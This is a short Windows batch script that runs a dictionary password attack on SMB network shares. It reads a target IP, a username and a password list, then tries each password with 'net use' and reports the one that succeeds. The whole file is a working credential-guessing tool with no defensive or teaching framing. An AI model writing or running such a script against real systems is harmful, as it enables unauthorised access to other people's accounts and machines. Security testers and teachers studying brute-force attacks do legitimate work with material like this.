@echo off
set /p ip="enter ip address: "
set /p user="enter username: "
set /p wordlist="enter password list: "

for /f %%a in (%wordlist%) do (
 set pass=%%a
 call :attempt
)
echo password not found!
pause
exit

:success
echo password found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% equ 0 goto success
